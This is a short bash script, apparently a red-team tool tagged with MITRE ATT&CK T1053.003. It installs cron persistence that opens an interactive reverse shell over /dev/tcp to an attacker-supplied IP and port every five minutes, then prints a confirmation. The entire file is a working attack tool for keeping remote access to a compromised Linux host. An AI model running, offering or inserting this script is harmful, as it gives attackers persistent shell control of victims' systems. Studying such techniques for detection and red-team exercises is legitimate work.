#!/usr/bin/env bash
# T1053.003 - cron persistence with a reverse-shell payload.
# Usage: ./cron_persistence.sh <attacker_ip> [port]
set -eu

ATTACKER="${1:?Usage: $0 <attacker_ip> [port]}"
PORT="${2:-4444}"

(crontab -l 2>/dev/null; \
  echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER/$PORT 0>&1'") | crontab -

echo "[*] Installed cron persistence (runs every 5 min, rev shell to $ATTACKER:$PORT)"
echo "[*] Verify: crontab -l"
